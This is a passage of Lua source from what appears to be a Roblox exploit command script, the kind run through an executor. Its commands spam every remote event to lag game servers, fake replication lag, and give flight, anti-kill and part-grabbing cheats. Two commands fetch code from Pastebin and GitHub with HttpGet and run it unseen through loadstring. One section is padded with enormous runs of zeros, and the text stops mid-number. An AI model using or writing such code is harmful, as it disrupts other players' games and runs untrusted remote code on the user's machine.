	lib.connect("spam", RunService.Stepped:Connect(function()
		for i = 1, amt do
			spawn(function()
				for _, remote in pairs(events) do
					remote:FireServer(str)
				end
				for _, remote in pairs(functions) do
					remote:InvokeServer(str)
				end
			end)
		end
	end))
end)

cmd.add({"unspam", "unlag", "unchatspam", "unanimlag", "unremotespam"}, {"unspam", "Stop all attempts to lag/spam"}, function()
	lib.disconnect("spam")
end)

cmd.add({"ping", "lag"}, {"ping <ms>", "Set your replication lag to a value"}, function(n)
	local ping = (tonumber(n) or 0)/1000
	settings():GetService("NetworkSettings").IncommingReplicationLag = ping
end)

cmd.add({"refresh", "re"}, {"refresh", "Respawn your character and teleport back to your previous position"}, function()
	local cf, p = CFrame.new(), character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Head")
	if p then
		cf = p.CFrame
	end
	respawn()
	player.CharacterAdded:Wait(); wait(0.2);
	character:WaitForChild("HumanoidRootPart").CFrame = cf
end)

cmd.add({"respawn"}, {"respawn", "Respawn your character"}, function()
	respawn()
end)

cmd.add({"trip", "platformstand"}, {"trip", "Trip your player"}, function()
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	local hrp = character:FindFirstChild("HumanoidRootPart")
	if hum then
		if hrp then
			hrp.RotVelocity = Vector3.new(-5, 0, 0)
		end
		hum.PlatformStand = true
	end
end)

cmd.add({"stand", "untrip"}, {"stand", "Stand up"}, function()
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	if hum then
		hum.PlatformStand = false
	end
end)

cmd.add({"sit"}, {"sit", "Sit your player"}, function()
	local hum = character:FindFirstChildWhichIsA("Humanoid")
	if hum then
		hum.Sit = true
	end
end)

cmd.add({"backdoorscan"}, {"backdoorscan", "Scans for any backdoors using FraktureSS"}, function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/unobfuscated.lua"))()
end)

cmd.add({"antikill", "nofekill", "antifekill"}, {"antikill", "Toggle FE kill prevention  -Cyrus"}, function()
	-- from cyrus
	if connections["antifekill"] then lib.disconnect("antifekill") return end
	local LP = game:GetService'Players'.LocalPlayer
	local OldCFrame = LP.Character.Head.CFrame
	local debounce = false
	local tools = {}
	for _,v in pairs(LP.Backpack:GetChildren()) do 
		if v:IsA'Tool' then 
			table.insert(tools,v)
		end
	end
	lib.connect("antifekill", LP.Character.ChildAdded:Connect(function(h)
		for _,v in pairs(tools) do if h == v then return end end 
		if h:IsA'Tool' then
			table.insert(tools,h)
			LP.Backpack:FindFirstChildOfClass'Tool'.Parent = LP.Character
			LP.Character:FindFirstChildOfClass'Tool'.Parent = LP.Backpack
			for i = 1,50 do 
				LP.Character.HumanoidRootPart.CFrame = OldCFrame
			end
			debounce = true 
			repeat wait(1) until not LP.Character:FindFirstChildOfClass'Tool'
			debounce = false
			if not debounce then 
				OldCFrame = LP.Character.Head.CFrame + Vector3.new(0,5,0)
			end 
		end
	end))
	
	lib.connect("antifekill", LP.Character.ChildRemoved:Connect(function(a)
		if a:IsA'Tool' then 
			table.insert(tools,a) 
		end 
	end))
end)

cmd.add({"move", "addpos", "translate", "trans"}, {"move <X,Y,Z>", "Moves your character by the given X,Y,Z coordinates"}, function(p)
	local players = argument.getPlayers(p)
	local pos = lib.parseText(p, opt.tupleSeparator)
	if character then
		if pos and #pos == 3 then
			local x,y,z = pos[1], pos[2], pos[3]
			character:TranslateBy(Vector3.new(x, y, z))
		end
	end
end)

local flyPart
cmd.add({"fly"}, {"fly [speed]", "Enable flight"}, function(speed)
	if not speed then speed = 5 end
	if connections["fly"] then lib.disconnect("fly") character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false end
	local dir = {w = false, a = false, s = false, d = false}
	local cf = Instance.new("CFrameValue")
	
	flyPart = flyPart or Instance.new("Part")
	flyPart.Anchored = true
	pcall(function()
		flyPart.CFrame = character.HumanoidRootPart.CFrame
	end)
	
	lib.connect("fly", RunService.RenderStepped:Connect(function()
		if not character:FindFirstChild("HumanoidRootPart") then return end
		local primaryPart = character.HumanoidRootPart
		local humanoid = character:FindFirstChildWhichIsA("Humanoid")
		
		local x, y, z = 0, 0, 0
		if dir.w then z = -1 * speed end
		if dir.a then x = -1 * speed end
		if dir.s then z = 1 * speed end
		if dir.d then x = 1 * speed end
		if dir.q then y = 1 * speed end
		if dir.e then y = -1 * speed end
		
		for i, v in pairs(character:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Velocity = Vector3.new(0, 0, 0)
				v.RotVelocity = Vector3.new(0, 0, 0)
			end
		end
		flyPart.CFrame = CFrame.new(
			flyPart.CFrame.p,
			(camera.CFrame * CFrame.new(0, 0, -100)).p
		)
		
		local moveDir = CFrame.new(x,y,z)
		cf.Value = cf.Value:lerp(moveDir, 0.2)
		flyPart.CFrame = flyPart.CFrame:lerp(flyPart.CFrame * cf.Value, 0.2)
		primaryPart.CFrame = flyPart.CFrame
		humanoid.PlatformStand = true
	end))
	lib.connect("fly", UserInputService.InputBegan:Connect(function(input, event)
		if event then return end
		local code, codes = input.KeyCode, Enum.KeyCode
		if code == codes.W then
			dir.w = true
		elseif code == codes.A then
			dir.a = true
		elseif code == codes.S then
			dir.s = true
		elseif code == codes.D then
			dir.d = true
		elseif code == codes.Q then
			dir.q = true
		elseif code == codes.E then
			dir.e = true
		elseif code == codes.Space then
			dir.q = true
		end
	end))
	lib.connect("fly", UserInputService.InputEnded:Connect(function(input, event)
		if event then return end
		local code, codes = input.KeyCode, Enum.KeyCode
		if code == codes.W then
			dir.w = false
		elseif code == codes.A then
			dir.a = false
		elseif code == codes.S then
			dir.s = false
		elseif code == codes.D then
			dir.d = false
		elseif code == codes.Q then
			dir.q = false
		elseif code == codes.E then
			dir.e = false
		elseif code == codes.Space then
			dir.q = false
		end
	end))
end)
cmd.add({"unfly"}, {"unfly", "Disable flight"}, function()
	lib.disconnect("fly")
	flyPart:Destroy()
	character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false
end)

cmd.add({"unanchorednograv"}, {"unanchorednograv", "Makes unanchored parts have 0 gravity"}, function()
	loadstring(game:HttpGet("https://pastebin.com/raw/MHdBcJQL", true))()
end)

cmd.add({"partgrabber"}, {"partgrabber", "Press Q"}, function()
-- ROBLOX FE PART + MOUSE FE SCRIPT
-- Made by Rolevote.
-- EXECUTE THIS SCRIPT ONCE PER SERVER
local player = game.Players.LocalPlayer.Character
local mouse = game.Players.LocalPlayer:GetMouse()
local key = game:GetService("UserInputService")

BodyAngularVelocity = true -- Want the Part/Handle to spin really fast Crazy!
local keyyy = Enum.KeyCode.Q -- Key to run it on part


local y = 5.7
local y2 = 7.2
local P = 1000000
local V = Vector3.new(100000,100000,100000)
local SBT = Instance.new("SelectionBox")
SBT.Name = "SB"
SBT.Parent = player.HumanoidRootPart
SBT.Adornee = player.HumanoidRootPart
SBT.Color3 = Color3.new(0,0,0)

while wait(.3) do
key.InputBegan:Connect(function(k)
 if k.KeyCode == keyyy then
 local handle = mouse.Target
 if handle.Anchored == false then
 wait(.3)
 handle.Position = handle.Position + Vector3.new(0,1,0)
 local BP = Instance.new("BodyPosition")
 BP.Name = "BP"
 BP.Parent = handle
 BP.P = P
 BP.MaxForce = V
 local SB = Instance.new("SelectionBox")
 SB.Name = "SB"
 SB.Parent = handle
 SB.Adornee = handle
 local colour = math.random(1,7)
    if colour == 1 then
 SB.Color3 = Color3.new(255,0,0)
    end
    if colour == 2 then
 SB.Color3 = Color3.new(255,170,0)
    end
    if colour == 3 then
 SB.Color3 = Color3.new(255,255,0)
    end
    if colour == 4 then
 SB.Color3 = Color3.new(0,255,0)
    end
    if colour == 5 then
 SB.Color3 = Color3.new(0,170,255)
    end
    if colour == 6 then
 SB.Color3 = Color3.new(170,0,255)
    end
    if colour == 7 then
 SB.Color3 = Color3.new(0,0,0)
    end
 player.Torso.Anchored = true
 if BodyAngularVelocity == true then
  local BAV = Instance.new("BodyAngularVelocity")
  BAV.Name = "BAV"
  BAV.Parent = handle
  BAV.P = 999000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
  BAV.AngularVelocity = Vector3.new(9990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,99900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000